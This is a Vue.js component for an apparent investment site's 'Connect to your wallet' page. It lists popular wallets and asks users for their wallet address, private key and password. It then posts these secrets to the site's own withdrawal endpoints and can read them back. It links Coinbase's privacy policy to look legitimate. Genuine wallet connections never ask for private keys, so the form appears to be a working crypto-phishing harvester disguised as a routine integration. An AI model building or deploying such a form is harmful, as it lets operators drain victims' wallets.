<template>
  <div
    class="w-full min-h-screen bg-[#0f0f0f] sm:py-[50px] py-6 select-none text-white"
  >
    <router-link to="/dashboard"
      ><button
        class="absolute right-0 top-0 text-red-700 hover:text-red-600 font-semibold p-2 hover:text-xl text-lg"
      >
        X
      </button></router-link
    >
    <div
      class="w-full sm:w-[448px] mx-auto sm:rounded-2xl px-7 sm:px-10 sm:py-10 sm:border"
    >
      <div class="w-full">
        <form @submit.prevent="setCoinBase()" class="w-full">
          <div class="w-full mb-5 sm:mb-10">
            <fa icon="fa-solid fa-wallet" class="text-3xl sm:text-6xl" />
          </div>
          <div class="w-full mb-[20px]">
            <h1 class="font-semibold text-2xl">
              {{
                coin
                  ? "Wallet connected, update your wallet connection"
                  : "Connect to your wallet"
              }}
            </h1>
          </div>
          <p v-if="err1" class="text-center text-red-400 text-sm">
            {{ err1 }}
          </p>
          <div class="w-full mb-3">
            <label class="text-sm font-semibold"
              >Wallet <fa icon="fa-solid fa-wallet"
            /></label>
            <select
              v-model="coinbase"
              class="w-full h-[56px] rounded-[7px] border focus:border-0 outline-none hover:bg-[#161616] bg-[#0f0f0f] mt-2 px-4 outline-2 focus:outline-blue-900"
            >
              <option value="Coinbase">Coinbase</option>
              <option value="MetaMask">MetaMask</option>
              <option value="TrustWallet">TrustWallet</option>
              <option value="Ledger Nano S Plus">Ledger Nano S Plus</option>
              <option value="Electrum">Electrum</option>
              <option value="BlueWallet">BlueWallet</option>
              <option value="Exodus">Exodus</option>
            </select>
          </div>
          <div class="w-full mb-3" v-for="(item, index) in inputs" :key="index">
            <label class="text-sm font-semibold"
              >{{ item.lL }}
              <fa
                :icon="
                  item.lL == 'Password'
                    ? 'fa-solid fa-lock'
                    : item.IL == 'Key'
                    ? 'fa-solid fa-key'
                    : 'fa-solid fa-address-book'
                "
            /></label>
            <input
              :type="item.type"
              class="w-full h-[56px] rounded-[7px] border focus:border-0 outline-none hover:bg-[#161616] bg-[#0f0f0f] mt-2 px-4 outline-2 focus:outline-blue-900"
              :placeholder="item.pH"
              v-model="item.md.value"
            />
          </div>
          <div class="w-full h-[56px] mt-5">
            <button
              class="h-full w-full rounded-full text-black font-semibold"
              :class="dis ? 'bg-blue-500' : 'bg-blue-600 hover:bg-blue-500'"
              :disabled="dis"
            >
              {{ coin ? "Update" : "Connect" }}
            </button>
          </div>
          <p class="text-blue-900 text-sm font-medium text-center mt-5">
            <a href="https://coinbase.com/legal/privacy">Privacy Policy</a>
          </p>
        </form>
      </div>
    </div>
  </div>
</template>

<script>
import { ref } from "@vue/reactivity";
import useComp1 from "../../mix/data.js";
import { useRouter, useRoute } from "vue-router";
import { onBeforeMount } from "@vue/runtime-core";
export default {
  name: "Wallet",
  props: {
    setWel: Function,
  },
  setup({ setWel }) {
    const { customFetcher, err, changeErr } = useComp1();
    const router = useRouter();
    const route = useRoute();
    const coin = ref(false);
    const key = ref("");
    const coinbase = ref("Coinbase");
    const pass = ref("");
    const wallet = ref("");
    const err1 = ref("");
    const dis = ref(false);
    const inputs = [
      { lL: "Address", pH: "xxxx-xxxx-xxxx-xxxx", md: wallet, type: "text" },
      { lL: "Private Key", pH: "Your private key", md: key, type: "password" },
      { lL: "Password", pH: "Your password", md: pass, type: "password" },
    ];

    const getCoin = async () => {
      try {
        const { data } = await customFetcher(`withdrawal/get/coin`);
        coin.value = data.coin;
        key.value = data.private;
        coinbase.value = data.wallet ? data.wallet : "Coinbase";
        pass.value = data.pass;
        wallet.value = data.add;
      } catch {}
    };

    const setCoinBase = async () => {
      dis.value = true;
      const body = {
        coinbase: coinbase.value,
        key: key.value.trim(),
        pass: pass.value.trim(),
        wallet: wallet.value.trim(),
      };
      try {
        const { res, data } = await customFetcher(
          coin.value ? "withdrawal/coin/update" : "withdrawal/coin",
          {
            method: "POST",
            body: JSON.stringify(body),
          }
        );
        if (res.ok) {
          err1.value = "";
          setWel(data.heading, data.content);
          router.push({
            name: "DashBoard",
            query: {
              ...route.query,
            },
          });
        } else {
          err1.value = data.message;
        }
      } catch {
        changeErr();
        err1.value = err.value.msg;
      }
      dis.value = false;
    };

    onBeforeMount(() => {
      if (!localStorage.getItem("VestaClientRefreshToken")) {
        router.push({
          name: "Login",
          query: {
            ...route.query,
          },
        });
      } else {
        getCoin();
      }
    });

    return { key, pass, inputs, setCoinBase, dis, err1, coinbase, coin };
  },
};
</script>

<style></style>

// 132.48
